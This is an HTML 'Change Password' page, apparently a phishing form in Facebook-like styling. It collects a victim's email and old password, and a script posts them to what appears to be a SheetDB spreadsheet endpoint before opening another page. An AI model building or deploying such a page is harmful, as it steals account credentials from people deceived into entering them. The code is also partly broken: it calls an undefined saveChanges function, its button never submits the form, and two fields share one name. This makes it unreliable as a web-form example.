<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-UA-Compatible" content="IE-edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password</title>
    <link href="sample.css" rel="stylesheet"   >
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        /* Form container */
        .container {
            background-color: #fff;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 1px solid #ccc;
            text-align: right;
            margin-top: 100px;
            position: relative;
            border-radius: 15px;
            padding-bottom: 60px;
        }

        h1 {
            color: black;
            text-align: right;
            margin-bottom: 20px;
        }

        hr {
            border: 1px solid #f1f1f1;
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"], input[type="password"], input[type="tel"], input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .password-note {
            font-size: 14px;
            color: #000000;
            margin-bottom: 10px;
            text-align: center;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .logout-other-devices {
            font-size: 14px;
            color: #000;
            margin-top: 10px;
        }

        .logout-other-devices input[type="checkbox"] {
            margin-left: 10px;
        }

        /* Save button */
        .signupbtn {
            padding: 10px 18px;
            width: 100%;
            font-size: 16px;
            margin: 20px 0 0 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #1877f2;
            color: white;
        }

        .signupbtn:hover {
            background-color: #166fe5;
        }

        /* Success message */
        .success-message {
            color: green;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>

    <!-- Form container -->
    <form action="423uat8ie9klx" method="post" id="sheetdb-form"  >
        <div class="container">
            <h1>Change Password</h1>
            <hr>
            <div class="password-note">
                Password must be at least 6 characters long, and should contain a mix of numbers, letters, and special characters such as: `%@$!`
            </div>

            <!-- Address Field -->
            <label for="email"><b>Email</b></label>
            <input type="text" placeholder="Enter Email" name="data[email]" required>

            <!-- Old Password Field -->
            <label for="password"><b>Old Password</b></label>
            <input type="password" placeholder="Enter Password" name="data[psw]" required>

            <!-- New Password Field -->
            <label for="new password"><b>New Password</b></label>
            <input type="password" placeholder="Enter New Password" name="data[pswrepeat]" required>

            <!-- Repeat New Password Field -->
            <label for="repeat-password"><b>Repeat New Password</b></label>
            <input type="password" placeholder="Repeat New Password" name="data[pswrepeat]" required>

            <!-- Logout from other devices -->
            <div class="logout-other-devices">
                <label>
                    <input type="checkbox" name="logout-devices">
                    Logout from other devices
                </label>
            </div>

            <!-- Save button -->
            <button type="button" class="signupbtn" onclick="saveChanges()">Save Changes</button>

            <!-- Forgot password -->
            <div class="forgot-password">
                <a href="#">Forgot Password?</a>
            </div>

            <!-- Success message -->
            <div id="successMessage" class="success-message">Changes Saved Successfully</div>
        </div>
    </form>

    <script>
        var form = document.getElementById('sheetdb-form');
        form.addEventListener("submit", e => {
          e.preventDefault();
          fetch(form.action, {
              method : "POST",
              body: new FormData(document.getElementById("sheetdb-form")),
          }).then(
              response => response.json()
          ).then((html) => {
            // you can put any JS code here
            window.open('d.html', '_blank');

          });
        });


        </script>
        
    </script>




</body>
</html>
